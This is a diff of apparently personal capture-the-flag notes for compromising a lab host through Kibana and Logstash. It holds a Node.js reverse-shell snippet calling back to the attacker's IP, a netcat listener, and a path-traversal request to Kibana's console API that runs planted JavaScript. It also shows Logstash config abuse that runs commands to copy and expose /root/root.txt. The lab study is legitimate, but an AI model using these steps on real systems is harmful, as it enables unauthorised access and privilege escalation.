@@ -2,7 +2,7 @@
 https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/
 
 #rev shell: the ip is the vpn ip and the port is w.e
-https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
+#https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
 (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -16,8 +16,8 @@ https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
     return /a/; // Prevents the Node.js application form crashing
 })();
 
-#localhost:1234 opens kibana
-ssh -L 1234:localhost:5601: security@10.10.10.115
+#localhost:9999 opens kibana
+ssh -L 9999:localhost:5601: security@10.10.10.115
 
 #ssh -L AAAAAA:BBBBBBB:CCCCCCC:DDDDDD@EEEEEEEEE
 A:  my local port
@@ -30,18 +30,20 @@ so.... on my localhost:A access B:C as if I were D@E
 # listen on the port
 nc -lvp PORT_IN_JS
 
-#runs the js to connect to the nc listenting port
-http://localhost:1234/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.krs2.js
+# can visit page in browser or curl to cause LFI execution
+# need a new .js file each time used
+# browser
+http://localhost:9999/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.krs2.js
+# curl
 curl -v 'http://localhost:9999/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.a.js'
 
-# must create new js each time for some reason
-#
-# check etc/logstash for config.d files
-# /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml
-
+#.conf files
 input {
         file {
-                path => "/opt/kibana/logstash_*" << DO I GO IN HERE AND CREATE THIS FILE?
+                path => "/opt/kibana/logstash_*"
+                #         ^ execute commands in these files
+                #           must have syntas:
+                #           Ejecutar comando: <any command>
                 start_position => "beginning"
                 sincedb_path => "/dev/null"
                 stat_interval => "10 second"
@@ -72,17 +74,17 @@ filter {
 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml
 
 #notes:
+
+# curl to get remote and listen on nc port
 curl -v 'http://localhost:9999/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.a.js'
-Ejecutar comando : find /root >> test.txt
+
+#locations of junk
 yml       : /etc/kibana && /etc/logstash
 logstash_*: /opt/kibana/
 *.conf    : /etc/logstash/conf.d
 logs      : /var/log/logstash
 
+# copy/paste when kibana
 cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf; rm /etc/logstash/conf.d/a.conf; cp /etc/logstash/conf.d/input.conf /etc/logstash/conf.d/a.conf
-cp /tmp/.template /opt/kibana/logstash_kun; cat /opt/kibana/logstash_kun; ls /opt/kibana
-
-/root/root.txt 
-Ejecutar comando : cat /root/root.txt >> /tmp/.temp.txt; rm test.txt
-Ejecutar comando : rm /tmp/.temp.txt
-Ejecutar comando : rm test.txt
+echo "Ejecutar comando : cp /root/root.txt /tmp/.test.txt" >> /opt/kibana/logstash_0
+echo "Ejecutar comando : chmod 777 /tmp/.test.txt" >> /opt/kibana/logstash_0
